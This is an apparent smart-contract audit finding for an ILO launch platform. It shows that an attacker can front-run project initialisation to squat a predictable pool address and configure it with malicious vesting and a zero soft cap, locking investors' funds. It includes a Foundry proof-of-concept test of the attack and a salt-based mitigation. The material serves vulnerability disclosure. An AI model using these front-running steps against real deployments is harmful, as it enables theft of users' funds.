# Vulnerability details

## Impact
Attacker can front-run or squat targeted pools to trap users funds

## Proof of Concept

This attack can cause a multitude of different issues, below I have shown a PoC for the worst possible case which is when an attacker front-runs a project initialization with malicious parameters to "squat" the Uniswap pool address. This can be a huge issue, as it can trick users into investing into the pool unknowingly, locking their money indefinetly.

Due to the volume and the nature of token launches, it is common practice for teams to setup frontends ahead of time. Due to the predictability of the blockchain and the pool interface being known ahead of time they may also hardcode the `ILOPool` address in the worst case. This allows an attacker to essentially inject a malicious `ILOPool` into a teams official frontend, leaving users clueless to the fact that they would be essentially locking their money away forever due to the malicious params.

Although this is the extreme case and is the scenario the PoC below is written to express. An attacker could also squat common pairs and tokens without liquidity that are planning to launch on the platform.

```solidity
contract PoC is ILOPoolTest {
  address public attacker = makeAddr('attacker');
  address public expectedOwner = makeAddr('expectedOwner');
  address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;


    function testAttackerCanFrontRunDeployment() external {
      IILOManager.InitProjectParams memory projectParams = IILOManager.InitProjectParams({
                    saleToken: SALE_TOKEN,
                    raiseToken: WETH,
                    fee: mockProject().fee,
                    initialPoolPriceX96: mockProject().initialPoolPriceX96, 
                    launchTime: mockProject().launchTime
                });

        // Deploy the pool
        vm.prank(attacker);
        address pool = iloManager.initProject(projectParams);

        // Reverts because the attacker front-runned the setup
        vm.prank(expectedOwner);
        vm.expectRevert(bytes("RE"));
        // Check that the attacker is the owner
        iloManager.initProject(projectParams);


        IILOVest.VestingConfig[] memory vestingConfigs = new IILOVest.VestingConfig[](1);

        IILOVest.LinearVest[] memory linearVestings = new IILOVest.LinearVest[](1);

        // Setup malicious configuration
        linearVestings[0] = IILOVest.LinearVest({
            shares: 10000,
            start: uint64(type(uint64).max),
            end: uint64(type(uint64).max)
        });

        vestingConfigs[0] = IILOVest.VestingConfig({
            shares: 10000,
            recipient: address(0),
            schedule: linearVestings
        });

        IILOManager.InitPoolParams memory params = IILOManager.InitPoolParams({
            uniV3Pool: pool,
            tickLower: MIN_TICK_500,
            tickUpper: -MIN_TICK_500,
            hardCap: 100e18,
            softCap: 0,
            maxCapPerUser: 100e18,
            start: uint64(block.timestamp-1),
            end: uint64(projectParams.launchTime -1),
            vestingConfigs: vestingConfigs
        });

        vm.startPrank(attacker);
        // Attacker tricks investors by setting up the pool with malicious configuration
        iloPool = iloManager.initILOPool(params);
        IILOWhitelist(iloPool).setOpenToAll(true);
        _writeTokenBalance(SALE_TOKEN, iloPool, 4000000000000000000);
        vm.stopPrank();

        // In the worst case scenario, due to the predictability of deployments teams launching with the platform could have setup the frontend with the precomputed address
        // Which would lead to this frontrun injecting a dangerous contract into a protocols official frontend
        // Unknowing user invests in the pool unknowingly that it got front-runned and squatted with malicious settings
        address user = makeAddr('user');

        _writeTokenBalance(WETH, user, 1e18);
        
        vm.startPrank(user);
        // User invests in the pool
        IERC20(WETH).approve(iloPool, 1e18);
        IILOPool(iloPool).buy(1e18, user);
        assertEq(IILOPool(iloPool).totalSold(), 4000000000000000000);
        vm.stopPrank();

        vm.warp(projectParams.launchTime + 1);

        // Somebody launches the pool
        // Refund time cannot be reached as softcap is 0 due to the malicious settings
        iloManager.launch(pool);

        vm.warp(projectParams.launchTime + 8 days);
        vm.expectRevert(bytes("PL"));
        // Somebody tries to refund
        vm.prank(user);
        IILOPool(iloPool).claimRefund(1);

        vm.warp(projectParams.launchTime + 365 days);
        // User tries to claim something after 1 year
        vm.prank(user);
        IILOPool(iloPool).claim(1);

        // User gets no tokens
        assertEq(IERC20(SALE_TOKEN).balanceOf(user), 0);
        assertEq(IERC20(WETH).balanceOf(user), 0);      
    }
}
```

## Recommended Mitigation Steps

The simplest fix is enforcing an invariant of one admin per "Project", and adding that admin's address to the salt of the `ILOPool` deployment to avoid accidental frontend injection.

This can be done by refactoring `_cachedProject[uniV3PoolAddress]` to instead store the "admin" as a key instead of the Uniswap V3 Pool.

With this we can remove the check in `_cacheProject` that checks `require(_project.uniV3PoolAddress == address(0), "RE");` which will allow multiple deployments per Uniswap V3 Pools.

We can now remove the `onlyProjectAdmin` modifier and instead retrieve the `Project` from storage as such `Project storage _project = _cachedProject[msg.sender];`

Now inside the salt to deploy the `ILOPool` we need to add the `msg.sender` as a salt parameter to ensure `ILOPool` deployments cant collide.

```solidity
            bytes32 salt = keccak256(abi.encodePacked(
                ChainId.get(),
                params.uniV3Pool,
                _initializedILOPools[params.uniV3Pool].length,
                msg.sender
            ));
```

Lastly we also need to adjust the code in the `ILOPool` by adding a variable `admin` to properly query the config from the `ILOManager`.
